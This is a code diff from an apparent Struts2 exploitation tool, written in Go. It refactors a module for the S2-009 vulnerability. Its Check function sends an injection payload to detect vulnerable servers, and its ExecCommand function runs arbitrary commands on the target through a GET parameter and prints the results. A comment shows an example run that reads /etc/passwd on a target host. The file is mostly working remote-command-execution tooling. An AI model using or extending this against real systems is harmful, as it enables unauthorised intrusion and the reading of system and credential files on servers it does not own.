@@ -1,62 +1,31 @@
 package s009
 
 import (
-	"ST2G/cvemod/x51utils"
+	"ST2G/cvemod/utils"
 	"fmt"
-	"io/ioutil"
-	"log"
-	"net/http"
+	"github.com/fatih/color"
+	"net/url"
 	"strings"
-	"time"
 )
 /*
 s2-009检测方式：
-	指定get参数名即可
+	指定get参数名
+	在模块这儿一次梳理好payload。
+ST2SG.exe --url http://192.168.123.128:8080/S2-009/ajax/example5.action --mode exec --vn 9 --data "name" --cmd "cat /etc/passwd"
  */
 
-func Check(targeturl string,getparam string){
-	targeturl = targeturl+x51utils.POC_s009_exec(getparam,"echo%20"+x51utils.Checkflag)
-	req, err := http.NewRequest("GET", targeturl, nil)
-	if err != nil {
-		log.Fatal("Error reading request. ", err)
-	}
-	client := &http.Client{Timeout: time.Second * 10}
-	resp, err := client.Do(req)
-	if err != nil {
-		log.Fatal("Error reading response. ", err)
-	}
-	defer resp.Body.Close()
-
-	body, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		log.Fatal("Error reading body. ")
-	}
-	respBody := string(body)
-	isVulnable := strings.Contains(respBody, x51utils.Checkflag)
-	if isVulnable {
-		x51utils.Colorlog("Found Struts2-009!")
-
-	} else {
+func Check(targetUrl string,getParam string){
+	targetUrl = targetUrl+ utils.POC_s009_exec(getParam,"echo%20"+utils.Checkflag)
+	respString := utils.GetFunc4Struts2(targetUrl,"","")
+	if utils.IfContainsStr(respString,utils.Checkflag){
+		color.Red("*Found Struts2-009！")
+	}else {
 		fmt.Println("Struts2-009 Not Vulnerable.")
 	}
 }
-func ExecCommand(getparam string,targeturl string,command string){
-	targeturl = targeturl+x51utils.POC_s009_exec(getparam,command)
-	req, err := http.NewRequest("GET", targeturl, nil)
-	if err != nil {
-		log.Fatal("Error reading request. ")
-	}
-	client := &http.Client{Timeout: time.Second * 10}
-	resp, err := client.Do(req)
-	if err != nil {
-		log.Fatal("Error reading response. ")
-	}
-	defer resp.Body.Close()
-
-	body, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		log.Fatal("Error reading body. ")
-	}
-	respBody := string(body)
-	fmt.Println(respBody)
+func ExecCommand(targetUrl string,command string,getParam string){
+	targetUrl = targetUrl+ utils.POC_s009_exec(getParam,url.QueryEscape(command))
+	respString := utils.GetFunc4Struts2(targetUrl,"","")
+	respString = strings.Replace(url.QueryEscape(respString),"%00","",-1)
+	fmt.Println(url.QueryUnescape(respString))
 }
